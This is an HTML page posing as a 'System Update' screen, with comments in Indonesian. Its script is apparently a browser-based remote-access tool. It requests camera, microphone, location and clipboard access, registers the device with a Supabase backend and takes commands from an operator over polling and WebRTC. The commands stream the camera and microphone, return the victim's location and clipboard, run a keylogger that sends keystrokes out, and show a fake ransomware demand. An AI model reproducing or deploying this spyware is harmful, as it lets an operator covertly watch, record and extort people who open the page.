<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Update</title>
  <style>
    body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; font-family:system-ui; }
    .loader { width:50px; height:50px; border:5px solid #333; border-top:5px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
    .status { margin:20px; font-size:18px; color:#0f0; }
    #info { font-size:12px; color:#888; text-align:center; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="status" id="status">Initializing...</div>
  <div id="info"></div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
  <script>
    // ====== GANTI SUPABASE_URL DENGAN PUNYA LU ======
    const SUPABASE_URL = 'https://your-project.supabase.co'; // <-- GANTI INI
    const SUPABASE_KEY = 'sb_publishable_r8uOjL7SgzxqjzimofJRrw_TamZDiIh';
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let deviceId = 'client_' + Math.random().toString(36).substr(2,6);
    let deviceName = navigator.userAgent.match(/Android/i) ? 'Android Device' : 'Unknown';
    let pc = null;
    let dc = null;

    async function init() {
      document.getElementById('status').innerText = 'Meminta izin...';
      try {
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        await navigator.permissions.query({ name: 'geolocation' });
        await navigator.permissions.query({ name: 'clipboard-read' });
      } catch (e) { console.log('Permission error', e); }

      document.getElementById('status').innerText = 'Mendaftarkan perangkat...';
      await supabase.from('devices').upsert({
        id: deviceId,
        name: deviceName,
        status: 'online',
        last_seen: new Date()
      });

      document.getElementById('info').innerHTML = `Device ID: ${deviceId}<br>Device: ${deviceName}`;
      document.getElementById('status').innerText = 'Menunggu perintah...';

      // WebRTC signaling
      supabase
        .channel('signaling_' + deviceId)
        .on('postgres_changes', {
          event: 'INSERT',
          schema: 'public',
          table: 'signaling',
          filter: `room=eq.${deviceId}`
        }, async (payload) => {
          if (payload.new.type === 'offer') await handleOffer(payload.new);
          else if (payload.new.type === 'candidate') {
            if (pc) await pc.addIceCandidate(JSON.parse(payload.new.candidate));
          }
        })
        .subscribe();

      // Polling commands fallback
      setInterval(async () => {
        const { data } = await supabase.from('commands').select('*').eq('device_id', deviceId).eq('status', 'pending');
        for (let cmd of data) {
          const result = await executeCommand(cmd.cmd);
          await supabase.from('commands').update({ result, status: 'done' }).eq('id', cmd.id);
          if (dc && dc.readyState === 'open') {
            dc.send(JSON.stringify({ type: 'result', data: result }));
          }
        }
      }, 3000);
    }

    async function handleOffer(offerData) {
      pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.ondatachannel = (event) => {
        dc = event.channel;
        dc.onmessage = async (e) => {
          const cmd = e.data;
          const result = await executeCommand(cmd);
          if (dc.readyState === 'open') {
            dc.send(JSON.stringify({ type: 'result', data: result }));
          }
        };
      };

      pc.onicecandidate = async (e) => {
        if (e.candidate) {
          await supabase.from('signaling').insert({ room: deviceId, type: 'candidate', candidate: JSON.stringify(e.candidate) });
        }
      };

      pc.ontrack = (e) => {
        // Admin bisa kirim track balik (misal buat remote control)
      };

      await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: offerData.sdp }));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      await supabase.from('signaling').insert({ room: deviceId, type: 'answer', sdp: answer.sdp });
    }

    async function executeCommand(cmd) {
      const parts = cmd.split(' ');
      const action = parts[0];
      try {
        switch (action) {
          case 'get_location':
            return new Promise((resolve) => {
              navigator.geolocation.getCurrentPosition(
                pos => resolve(JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })),
                err => resolve('{}')
              );
            });
          case 'get_clipboard':
            return await navigator.clipboard.readText();
          case 'start_camera':
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: parts[1] === 'front' ? 'user' : 'environment' } });
            if (pc) pc.addTrack(stream.getVideoTracks()[0], stream);
            return 'camera_started';
          case 'start_mic':
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            if (pc) pc.addTrack(audioStream.getAudioTracks()[0], audioStream);
            return 'mic_started';
          case 'start_keylog':
            document.addEventListener('keydown', (e) => {
              if (dc && dc.readyState === 'open') {
                dc.send(JSON.stringify({ type: 'keylog', data: e.key }));
              }
            });
            return 'keylogger_started';
          case 'chat':
            const msg = cmd.substring(5);
            if (dc && dc.readyState === 'open') {
              dc.send(JSON.stringify({ type: 'chat', data: msg }));
            }
            return 'chat_sent';
          case 'torch':
            alert('🔦 Senter tidak support di web (simulasi)');
            return 'torch_simulated';
          case 'ransomware':
            alert('💀 HP LU DIKUNCI! Bayar 1 BTC ke alamat... (simulasi)');
            return 'ransomware_activated';
          default:
            return `unknown: ${cmd}`;
        }
      } catch (e) {
        return `error: ${e.message}`;
      }
    }

    init();
  </script>
</body>
</html>
